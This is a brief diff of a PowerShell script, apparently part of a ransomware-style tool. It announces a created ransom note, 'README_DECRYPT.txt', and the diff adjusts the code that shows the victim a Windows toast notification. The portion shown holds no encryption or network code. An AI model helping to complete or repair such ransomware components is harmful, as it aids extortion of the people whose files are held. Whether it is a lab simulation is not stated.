@@ -51,7 +51,9 @@ $utf8Bom = New-Object System.Text.UTF8Encoding $true
 Write-Host "Note de rancon creee : README_DECRYPT.txt"
 
 # --- NOTIFICATION TOAST ---
+# --- NOTIFICATION TOAST ---
 [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
+[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
 
 $toastXml = @"
 <toast>
@@ -64,7 +66,7 @@ $toastXml = @"
 </toast>
 "@
 
-$xml = New-Object Windows.Data.Xml.Dom.XmlDocument
+$xml = [Windows.Data.Xml.Dom.XmlDocument]::new()
 $xml.LoadXml($toastXml)
 
 $toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
